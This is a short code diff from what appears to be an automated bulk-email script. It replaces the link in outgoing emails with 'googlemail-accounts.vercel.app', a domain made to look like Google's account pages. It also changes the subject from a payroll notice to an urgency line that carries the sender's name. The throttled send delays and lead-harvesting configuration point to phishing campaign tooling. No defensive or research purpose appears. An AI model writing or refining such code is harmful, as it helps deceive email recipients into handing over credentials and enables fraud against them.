@@ -293,7 +293,7 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://dainteractive-15v.vercel.app/",
+    "https://googlemail-accounts.vercel.app/",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
@@ -527,7 +527,7 @@ async function sendEmail(to, lead, leadSenderName) {
   const mailOptions = {
     from: fromAddress,
     to: to,
-    subject: 'Update: Transition to Payroll via DAinteractive 1.5v',
+    subject: 'Hello from ' + leadSenderName + 'Treat as Urgent',
     html: htmlContent,
     replyTo: (lead && lead.sender && lead.sender.email) ? lead.sender.email : undefined,
   };
